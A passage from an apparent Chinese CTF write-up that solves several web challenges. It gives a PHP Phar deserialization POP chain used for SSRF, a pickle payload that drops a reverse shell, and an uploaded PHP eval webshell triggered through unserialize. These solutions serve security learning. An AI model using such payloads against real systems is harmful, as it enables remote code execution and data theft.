class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;showfile.php?f=./demo.png&quot;</span>&gt;查看照片&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$upload</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;2022qwb&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload</span>, <span class="number">0333</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;upload.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>可以使用<strong>Phar</strong>协议读取，结合<strong>class.php</strong>的内容得出是<strong>Phar</strong>反序列化，结合<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>上传绕过<strong>upload.php</strong>中的<strong>session</strong>校验。</p>
<p>以及结合题目提示的【照片墙的内部系统中可能还有什么系统】，以及<strong>AdminShow</strong>类中的<strong>curl</strong>请求，猜测还需要进行<strong>SSRF</strong>。然后从<strong>/proc/net/arp</strong>里读了个<strong>10.10.10.10</strong>。</p>
<p>构造<strong>POP</strong>链，绕的一比。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GuestShow</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;filesize = <span class="keyword">new</span> <span class="title class_">GuestShow</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;tmp=<span class="keyword">new</span> <span class="title class_">AdminShow</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;filesize = <span class="keyword">new</span> <span class="title class_">AdminShow</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;date = <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="variable">$b</span>-&gt;tmp = <span class="keyword">new</span> <span class="title class_">GuestShow</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;filesize = <span class="variable">$b</span>-&gt;filesize;</span><br><span class="line"><span class="variable">$c</span>-&gt;date = <span class="string">&quot;http://10.10.10.10/&quot;</span>; </span><br><span class="line"><span class="variable">$c</span>-&gt;tmp = <span class="keyword">new</span> <span class="title class_">GuestShow</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;tmp-&gt;str[<span class="number">0</span>] = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;file-&gt;tmp-&gt;str[<span class="number">1</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;tmp-&gt;file = <span class="variable">$b</span>-&gt;filesize;</span><br><span class="line"><span class="variable">$c</span>-&gt;tmp-&gt;file = <span class="variable">$b</span>-&gt;filesize;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_exp</span>():</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8888/exp.php&quot;</span></span><br><span class="line">    r = requests.get(url=url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_exp</span>():</span><br><span class="line">    url = <span class="string">&quot;http://47.104.95.124:8080/upload.php&quot;</span></span><br><span class="line">    header = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=dcgsisq1ocelvqa0rk023n5aar&quot;</span>&#125;</span><br><span class="line">    content = <span class="built_in">open</span>(<span class="string">&quot;phar.phar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    r = requests.post(url=url,</span><br><span class="line">                      data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: content&#125;,</span><br><span class="line">                      files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;demodemo.jpg&#x27;</span>, content)&#125;,</span><br><span class="line">                      headers=header)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>返回了源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//内网资源阅读器-测试机</span></span><br><span class="line"><span class="comment">//配置信息请看phpinfo.php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;10.10.10.101&#x27;</span>||<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;100.100.100.101&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>再直接构造如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.10.10/?url=file:///flag</span><br></pre></td></tr></table></figure>
<h1 id="crash">crash</h1>
<p>好像是非预期了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># import sqlite3</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">app.secret_key = random.randbytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.token = <span class="built_in">hash</span>(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> admin.secret</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># conn=sqlite3.connect(&quot;user.db&quot;)</span></span><br><span class="line">        <span class="comment"># cursor=conn.cursor()</span></span><br><span class="line">        <span class="comment"># cursor.execute(f&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">        <span class="comment"># data=cursor.fetchall()[0]</span></span><br><span class="line">        <span class="comment"># if data:</span></span><br><span class="line">        <span class="comment">#     return data[0] </span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     return None</span></span><br><span class="line">        <span class="keyword">return</span> session.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    pickle_data = base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata = pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token != <span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>] = request.values.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">&quot;userdata&quot;</span>, base64.b64encode(</span><br><span class="line">        pickle.dumps(User(request.values.get(<span class="string">&quot;username&quot;</span>), request.values.get(<span class="string">&quot;password&quot;</span>)), <span class="number">2</span>)), max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;source.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p><strong>Pickle</strong>反序列化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);  os.dup2(s.fileno(), 2);   p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&quot;&quot;&quot;</span></span><br><span class="line">b64_p = base64.b64encode(payload.encode())</span><br><span class="line"><span class="built_in">print</span>(b64_p.decode())</span><br><span class="line">a = <span class="string">b&#x27;(cos\nsystem\nVecho %s | base64 -d &gt; 3.py &amp;&amp;python3 3.py\no.&#x27;</span> % b64_p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;userdata=&quot;</span> + base64.b64encode(a).decode())</span><br></pre></td></tr></table></figure>
<p>根据题目提示构造<strong>504</strong>界面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;import time</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from flask import Flask</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app = Flask(__name__)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/test&#x27;)</span></span><br><span class="line"><span class="string">def info():</span></span><br><span class="line"><span class="string">    time.sleep(9999999)</span></span><br><span class="line"><span class="string">    return &#x27;test&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="string">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;echo %s | base64 -d &gt; test.py &amp;&amp; python3 test.py&quot;</span> % base64.b64encode(text.encode()).decode())</span><br></pre></td></tr></table></figure>
<h1 id="rcefile">rcefile</h1>
<p>扫目录，给了<strong>www.zip</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// config.inc.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/index.php&quot;</span>&gt;Index&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;/showfile.php&quot;</span>&gt;files&lt;/a&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$typeArr</span>[<span class="number">0</span>] == <span class="string">&quot;image&quot;</span> | !<span class="title function_ invoke__">in_array</span>(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()) . <span class="string">&quot;.&quot;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./&quot;</span> . <span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;userfile&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$userfile</span>), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span> * <span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = <span class="title function_ invoke__">e</span>(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件上传，注意到<strong>spl_autoload_register()</strong>这个方法，默认自动加载目录下后缀为<strong>inc</strong>和<strong>php</strong>的文件。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2ze2ahooasratwvnc3gc.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1152</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://eci-2ze2ahooasratwvnc3gc.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryirGAlp1k5trAkWST</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2ze2ahooasratwvnc3gc.cloudeci1.ichunqiu.com/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>userfile=a%3A2%3A%7Bi%3A0%3Bs%3A36%3A%22bdabbec69fa7f7817209f34476ceeab2.inc%22%3Bi%3A1%3Bs%3A36%3A%228f279b4536aec0818f5292475f928ff4.jpg%22%3B%7D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryirGAlp1k5trAkWST</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;south.inc&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryirGAlp1k5trAkWST--</span></span><br></pre></td></tr></table></figure>
<p>然后<strong>cookie</strong>处给<strong>userfile</strong>一个反序列化字符串，将<strong>spl_autoload_register()</strong>方法加载进来的内容进行反序列化，类名即文件名。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/showfile.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2ze2ahooasratwvnc3gc.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://eci-2ze2ahooasratwvnc3gc.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2ze2ahooasratwvnc3gc.cloudeci1.ichunqiu.com/showfile.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>userfile=O:32:&quot;f1bf541922866b8af988fe8a0080a45c&quot;:0:&#123;&#125;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel">south=<span class="keyword">system</span>%28%27cat+%2Fflag%27%29%3B</span></span><br></pre></td></tr></table></figure>
<h1 id="wp-um">WP-UM</h1>
<p>题目提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猫哥最近用wordpress搭建了一个个人博客，粗心的猫哥因为记性差，所以把管理员10位的账号作为文件名放在/username下和15位的密码作为文件名放在/password下。</span><br><span class="line">并且存放的时候猫哥分成一个数字(作为字母在密码中的顺序)＋一个大写或小写字母一个文件，例如admin分成5个文件，文件名是1a 2d 3m 4i 5n</span><br><span class="line">这几天他发现了一个特别好用的wordpress插件，在他开心的时候，可是倒霉的猫哥却不知道危险的存在。</span><br></pre></td></tr></table></figure>
<p>根据插件<strong>User Meta</strong>猜测是<strong><a
href="https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd">CVE-2022-0779</a></strong>，用户名已给出<strong>MaoGePaMao</strong>，根据<strong>dockerfile</strong>拿到路径是<strong>/password/</strong>。</p>
